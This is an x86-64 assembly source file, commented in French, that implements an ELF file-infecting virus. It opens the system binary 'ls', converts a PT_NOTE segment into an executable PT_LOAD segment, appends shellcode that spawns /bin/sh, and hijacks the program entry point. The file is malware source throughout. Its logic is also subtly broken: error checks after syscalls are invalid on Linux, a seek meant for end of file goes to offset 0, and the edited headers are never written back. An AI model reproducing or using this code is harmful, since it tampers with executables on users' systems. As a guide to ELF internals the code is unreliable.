section .data
    filename db "ls", 0                     ; Nom du fichier hardcodé pour le moment
    err_open db "Erreur : ouverture de fichier", 0
    err_read db "Erreur : lecture du fichier", 0
    err_close db "Erreur : fermeture du fichier", 0
    err_note db "Erreur : aucun segment PT_NOTE trouvé", 0
    err_write db "Erreur : écriture du fichier", 0
    err_entry db "Erreur : modification du point d'entrée", 0
    err_phdr db "Erreur : modification des en-têtes de programme", 0

    ; Constantes pour les types de segments
    PT_LOAD equ 1                           ; Type de segment PT_LOAD
    PT_NOTE equ 4                           ; Type de segment PT_NOTE
    PF_R    equ 4                           ; Flag Permission Lecture
    PF_X    equ 1                           ; Flag Permission Exécution
    PF_W    equ 2                           ; Flag Permission Écriture
    LOAD_ADDR equ 0xc000000                 ; Adresse de chargement haute
    NEW_ENTRY_POINT equ 0xc000000           ; Nouvelle adresse du point d'entrée

    program_header_table times 4096 db 0

section .bss
    file_buffer resb 4096                   ; Buffer pour les opérations de lecture/écriture
    program_headers resb 4096               ; Buffer pour stocker les en-têtes de programme

section .shellcode
    shellcode_start:
        db 0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53
        db 0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0, 0x3b, 0x0f, 0x05
        push r14                                ; Sauvegarder l'ancien point d'entrée
        ret                                    ; Retourner à l'ancien point d'entrée
    shellcode_end:


section .text
    global _start

_start:
    ; Ouvrir le fichier en lecture/écriture
    mov rax, 2                              ; Appel système SYS_OPEN
    mov rdi, filename                       ; Nom du fichier (hardcodé)
    mov rsi, 2                              ; Flags O_RDWR (lecture et écriture)
    mov rdx, 0                              ; Ignoré pour O_RDWR
    syscall
    jc error_open                           ; Gérer l'erreur si l'ouverture échoue
    mov rbx, rax                            ; Sauvegarde le descripteur de fichier dans rbx

    ; Allocation d'un espace sur la pile pour l'en-tête ELF
    sub rsp, 1000h                          ; Réserver plus d'espace (4 Ko)

    ; Lire l'en-tête ELF
    mov rax, 0                              ; Appel système SYS_READ
    mov rdi, rbx                            ; Descripteur de fichier
    lea rsi, [rsp]                          ; Adresse de l'espace mémoire pour l'en-tête ELF
    mov rdx, 1000h                          ; Taille de l'en-tête ELF (4 Ko)
    syscall
    jc error_read                           ; Gérer l'erreur si la lecture échoue

    ; Sauvegarder certaines informations de l'en-tête ELF
    mov r14, [rsp + 0x18]                   ; e_entry se trouve à l'offset 0x18 dans l'en-tête ELF
    mov r15w, [rsp + 0x38]                   ; e_phnum (nombre d'en-têtes de programme)
    mov r12, [rsp + 0x20]                   ; e_phoff (offset de la table des en-têtes de programme)

    ; Lire la table des en-têtes de programme
    mov rax, 8                              ; Appel système SYS_LSEEK
    mov rdi, rbx                            ; Descripteur de fichier
    mov rsi, r12                            ; Offset de la table des en-têtes de programme
    xor rdx, rdx                            ; SEEK_SET (commencer au début)
    syscall
    jc error_read

    ; Lire tous les en-têtes de programme
    mov rax, 0                              ; Appel système SYS_READ
    mov rdi, rbx                            ; Descripteur de fichier
    mov rsi, program_headers                ; Buffer pour stocker les en-têtes de programme
    mov rdx, 4096                           ; Taille maximale des en-têtes
    syscall
    jc error_read

    ; Parcourir les en-têtes de programme pour trouver et modifier le segment PT_NOTE
    xor rcx, rcx                            ; Initialiser le compteur à 0
    mov r13, program_headers                ; Pointer vers le début des en-têtes de programme

find_note_segment:
    cmp rcx, r15                            ; Comparer avec le nombre total d'en-têtes
    je no_note_segment                      ; Si on a tout parcouru sans trouver PT_NOTE, sauter à no_note_segment

    ; Vérifier le type de segment (offset 0 dans chaque en-tête de programme)
    mov eax, [r13]                          ; Récupérer le type de segment
    cmp eax, PT_NOTE                        ; Comparer avec PT_NOTE
    je modify_note_segment                  ; Si trouvé, modifier le segment

    ; Passer à l'en-tête de programme suivant
    add r13, 56                             ; Taille d'un en-tête de programme (56 octets)
    inc rcx
    jmp find_note_segment

modify_note_segment:
    ; Modifier le type de segment de PT_NOTE à PT_LOAD
    mov dword [r13], PT_LOAD                ; Changer le type de segment

    ; Modifier les permissions (lecture + exécution)
    mov dword [r13 + 4], PF_R | PF_X        ; Flags (lecture et exécution)

    ; Mettre à jour l'adresse virtuelle et l'offset
    mov qword [r13 + 16], LOAD_ADDR         ; p_vaddr (adresse haute en mémoire)
    mov qword [r13 + 8], NEW_ENTRY_POINT    ; p_offset (fin actuelle du fichier)

    ; Définir la taille du segment en fichier et mémoire
    mov rax, shellcode_end                  ; Taille du shellcode
    sub rax, shellcode_start                ; Calcul de la taille
    mov qword [r13 + 32], rax               ; p_filesz
    mov qword [r13 + 40], rax               ; p_memsz

    ; Alignement (par exemple, 0x1000 pour les pages mémoire)
    mov qword [r13 + 48], 0x1000            ; p_align

    jmp write_modified_headers

write_modified_headers:

    ; Positionner le fichier à la fin
    mov rax, 8                              ; SYS_LSEEK
    mov rdi, rbx                            ; Descripteur de fichier
    xor rsi, rsi
    xor rdx, rdx
    syscall

    ; Écrire le shellcode
    mov rax, 1                              ; SYS_WRITE
    mov rdi, rbx
    mov rsi, shellcode_start                ; Adresse du shellcode
    mov rdx, shellcode_end - shellcode_start; Taille du shellcode
    syscall
    jc error_write
    
    ; Modifier le point d'entrée
    mov qword [rsp + 0x18], NEW_ENTRY_POINT ; Modifier l'adresse du point d'entrée

    ; Repositionner le pointeur de fichier au début
    mov rax, 8                              ; Appel système SYS_LSEEK
    mov rdi, rbx                            ; Descripteur de fichier
    xor rsi, rsi                            ; Offset (0, pour le début du fichier)
    xor rdx, rdx                            ; SEEK_SET (commencer au début)
    syscall
    jc error_write

    ; Écrire les modifications dans le fichier ELF
    mov rax, 1                              ; Appel système SYS_WRITE
    mov rdi, rbx                            ; Descripteur de fichier
    lea rsi, [rsp]                          ; Adresse de l'en-tête ELF modifié
    mov rdx, 1000h                          ; Taille de l'en-tête ELF (4 Ko)
    syscall
    jc error_write

    jmp close_file

no_note_segment:
    ; Aucun segment PT_NOTE trouvé
    call error_note

close_file:
    ; Fermer le fichier
    mov rax, 3                              ; Appel système SYS_CLOSE
    mov rdi, rbx                            ; Descripteur de fichier
    syscall
    jc error_close                          ; Gérer l'erreur si la fermeture échoue

exit:
    mov rax, 60                             ; Appel système SYS_EXIT
    xor rdi, rdi                            ; Code de sortie 0
    syscall

error_open:
    mov rsi, err_open
    call error

error_read:
    mov rsi, err_read
    call error

error_write:
    mov rsi, err_write
    call error

error_close:
    mov rsi, err_close
    call error

error_note:
    mov rsi, err_note
    call error

error_entry:
    mov rsi, err_entry
    call error

error_phdr:
    mov rsi, err_phdr
    call error

error:
    mov rax, 1                              ; SYS_WRITE
    mov rdi, 2                              ; Descripteur de sortie (STDERR)
    mov rdx, 64                             ; Taille du message d'erreur
    syscall
    jmp exit